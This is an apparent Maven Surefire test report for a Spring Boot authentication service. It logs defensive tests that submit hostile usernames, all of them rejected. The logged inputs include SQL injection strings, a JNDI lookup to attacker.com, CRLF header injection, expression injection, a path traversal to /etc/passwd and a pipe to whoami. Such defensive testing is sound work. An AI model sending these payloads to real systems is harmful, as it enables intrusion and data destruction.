<?xml version="1.0" encoding="UTF-8"?>
<testsuite xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="https://maven.apache.org/surefire/maven-surefire-plugin/xsd/surefire-test-report.xsd" version="3.0.2" name="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="21.089" tests="12" errors="0" skipped="0" failures="0">
  <properties>
[...]
</properties>
  <testcase name="shouldPreventSqlInjectionInUsername" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="0.134">
    <system-out><![CDATA[17:10:16.700 [main] INFO  o.s.t.c.s.AnnotationConfigContextLoaderUtils - Could not detect default configuration classes for test class [mx.com.qtx.seguridad.security.SecurityAttackProtectionTest]: SecurityAttackProtectionTest does not declare any static, non-private, non-final, nested classes annotated with @Configuration.

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/

 :: Spring Boot ::                (v3.5.3)

17:10:16.747 [main] INFO  m.c.q.s.s.SecurityAttackProtectionTest - Starting SecurityAttackProtectionTest using Java 21.0.3 with PID 103766 (started by usuario in /home/usuario/Asp/github repositorios/curso/CotizadorPcPartes/ms-seguridad)
17:10:16.747 [main] DEBUG m.c.q.s.s.SecurityAttackProtectionTest - Running with Spring Boot v3.5.3, Spring v6.2.8
17:10:16.747 [main] INFO  m.c.q.s.s.SecurityAttackProtectionTest - The following 1 profile is active: "test"
17:10:16.970 [main] INFO  o.s.d.r.c.RepositoryConfigurationDelegate - Bootstrapping Spring Data JPA repositories in DEFAULT mode.
17:10:16.979 [main] INFO  o.s.d.r.c.RepositoryConfigurationDelegate - Finished Spring Data repository scanning in 7 ms. Found 3 JPA repository interfaces.
17:10:17.058 [main] INFO  o.a.coyote.http11.Http11NioProtocol - Initializing ProtocolHandler ["http-nio-auto-4"]
17:10:17.058 [main] INFO  o.a.catalina.core.StandardService - Starting service [Tomcat]
17:10:17.059 [main] INFO  o.a.catalina.core.StandardEngine - Starting Servlet engine: [Apache Tomcat/10.1.42]
17:10:17.075 [main] INFO  o.a.c.c.C.[.[.[/seguridad/v1/api] - Initializing Spring embedded WebApplicationContext
17:10:17.115 [main] INFO  m.c.q.s.config.RsaKeyProvider - Generando nuevo par de llaves RSA de 2048 bits
17:10:17.186 [main] INFO  m.c.q.s.config.RsaKeyProvider - Par de llaves RSA generado exitosamente en Wed Jul 02 17:10:17 MST 2025
17:10:17.314 [main] INFO  o.s.o.j.p.SpringPersistenceUnitInfo - No LoadTimeWeaver setup: ignoring JPA class transformer
17:10:17.332 [main] WARN  org.hibernate.orm.deprecation - HHH90000025: MySQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
17:10:17.385 [main] INFO  o.s.o.j.LocalContainerEntityManagerFactoryBean - Initialized JPA EntityManagerFactory for persistence unit 'default'
17:10:17.514 [main] DEBUG m.c.q.s.s.JwtAuthenticationFilter - Filter 'jwtAuthenticationFilter' configured for use
17:10:17.532 [main] INFO  m.c.q.s.service.KeyManagementService - Iniciando KeyManagementService...
17:10:17.533 [main] INFO  m.c.q.s.service.KeyManagementService - KeyManagementService inicializado exitosamente
17:10:17.533 [main] INFO  m.c.q.s.service.KeyManagementService - Estado de llaves: RSA Key Info - Algorithm: RSA, KeySize: 2048 bits, Generated: Wed Jul 02 17:10:17 MST 2025, Modulus Length: 2048
17:10:17.610 [main] WARN  o.s.b.a.o.j.JpaBaseConfiguration$JpaWebConfiguration - spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
17:10:17.882 [main] INFO  o.a.coyote.http11.Http11NioProtocol - Starting ProtocolHandler ["http-nio-auto-4"]
17:10:17.889 [main] INFO  m.c.q.s.s.SecurityAttackProtectionTest - Started SecurityAttackProtectionTest in 1.179 seconds (process running for 31.528)
17:10:17.900 [http-nio-auto-4-exec-1] INFO  o.a.c.c.C.[.[.[/seguridad/v1/api] - Initializing Spring DispatcherServlet 'dispatcherServlet'
17:10:17.914 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin'; DROP TABLE usuario; --
17:10:17.918 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:17.921 [http-nio-auto-4-exec-1] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin'; DROP TABLE usuario; --
17:10:17.921 [http-nio-auto-4-exec-1] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin'; DROP TABLE usuario; --: Credenciales inválidas
17:10:17.935 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin' OR '1'='1
17:10:17.939 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:17.941 [http-nio-auto-4-exec-2] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin' OR '1'='1
17:10:17.942 [http-nio-auto-4-exec-2] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin' OR '1'='1: Credenciales inválidas
17:10:17.955 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin' UNION SELECT * FROM usuario --
17:10:17.957 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:17.959 [http-nio-auto-4-exec-3] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin' UNION SELECT * FROM usuario --
17:10:17.960 [http-nio-auto-4-exec-3] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin' UNION SELECT * FROM usuario --: Credenciales inválidas
17:10:17.968 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin'; INSERT INTO usuario VALUES ('hacker', 'pass'); --
17:10:17.970 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:17.974 [http-nio-auto-4-exec-4] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin'; INSERT INTO usuario VALUES ('hacker', 'pass'); --
17:10:17.974 [http-nio-auto-4-exec-4] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin'; INSERT INTO usuario VALUES ('hacker', 'pass'); --: Credenciales inválidas
17:10:17.986 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: ' OR 1=1 --
17:10:17.989 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:17.991 [http-nio-auto-4-exec-5] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: ' OR 1=1 --
17:10:17.991 [http-nio-auto-4-exec-5] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario ' OR 1=1 --: Credenciales inválidas
17:10:18.001 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin'/**/OR/**/1=1--
17:10:18.003 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.006 [http-nio-auto-4-exec-6] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin'/**/OR/**/1=1--
17:10:18.006 [http-nio-auto-4-exec-6] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin'/**/OR/**/1=1--: Credenciales inválidas
17:10:18.015 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin' OR 'x'='x
17:10:18.017 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.019 [http-nio-auto-4-exec-7] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin' OR 'x'='x
17:10:18.020 [http-nio-auto-4-exec-7] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin' OR 'x'='x: Credenciales inválidas
]]></system-out>
  </testcase>
  <testcase name="shouldRejectDangerousSpecialCharacters" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="0.083">
    <system-out><![CDATA[17:10:18.034 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin&amp#0;password
17:10:18.035 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.040 [http-nio-auto-4-exec-8] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin&amp#0;password
17:10:18.041 [http-nio-auto-4-exec-8] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin&amp#0;password: Credenciales inválidas
17:10:18.051 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
Set-Cookie: admin=true
17:10:18.053 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.055 [http-nio-auto-4-exec-9] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin
Set-Cookie: admin=true
17:10:18.055 [http-nio-auto-4-exec-9] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin
Set-Cookie: admin=true: Credenciales inválidas
17:10:18.063 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin${jndi:ldap://attacker.com/a}
17:10:18.065 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.067 [http-nio-auto-4-exec-10] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin${jndi:ldap://attacker.com/a}
17:10:18.067 [http-nio-auto-4-exec-10] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin${jndi:ldap://attacker.com/a}: Credenciales inválidas
17:10:18.078 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin#{7*7}
17:10:18.080 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.082 [http-nio-auto-4-exec-1] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin#{7*7}
17:10:18.082 [http-nio-auto-4-exec-1] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin#{7*7}: Credenciales inválidas
17:10:18.090 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: ../../../etc/passwd
17:10:18.092 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.094 [http-nio-auto-4-exec-2] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: ../../../etc/passwd
17:10:18.094 [http-nio-auto-4-exec-2] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario ../../../etc/passwd: Credenciales inválidas
17:10:18.101 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin|whoami
17:10:18.103 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.105 [http-nio-auto-4-exec-3] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin|whoami
17:10:18.105 [http-nio-auto-4-exec-3] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin|whoami: Credenciales inválidas
]]></system-out>
  </testcase>
  <testcase name="shouldHandleRequestBursts" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="13.837">
    <system-out><![CDATA[17:10:18.116 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:18.118 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.387 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:18.390 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:18.390 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:18 MST 2025, expiration: Wed Jul 02 18:10:18 MST 2025
17:10:18.393 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:18.394 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:18.394 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:18.404 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:18.405 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.664 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:18.667 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:18.667 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:18 MST 2025, expiration: Wed Jul 02 18:10:18 MST 2025
17:10:18.669 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:18.670 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:18.670 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:18.678 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:18.680 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.944 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:18.947 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:18.947 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:18 MST 2025, expiration: Wed Jul 02 18:10:18 MST 2025
17:10:18.948 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:18.950 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:18.950 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:18.958 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:18.962 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:19.222 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:19.225 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:19.225 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:19 MST 2025, expiration: Wed Jul 02 18:10:19 MST 2025
17:10:19.227 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:19.228 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:19.228 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:19.235 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:19.236 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:19.493 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:19.496 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:19.496 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:19 MST 2025, expiration: Wed Jul 02 18:10:19 MST 2025
17:10:19.498 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:19.500 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:19.500 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:19.509 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:19.510 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:19.767 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:19.769 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:19.769 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:19 MST 2025, expiration: Wed Jul 02 18:10:19 MST 2025
17:10:19.771 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:19.773 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:19.773 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:19.780 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:19.782 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:20.041 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:20.043 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:20.043 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:20 MST 2025, expiration: Wed Jul 02 18:10:20 MST 2025
17:10:20.045 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:20.047 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:20.047 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:20.054 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:20.056 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:20.319 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
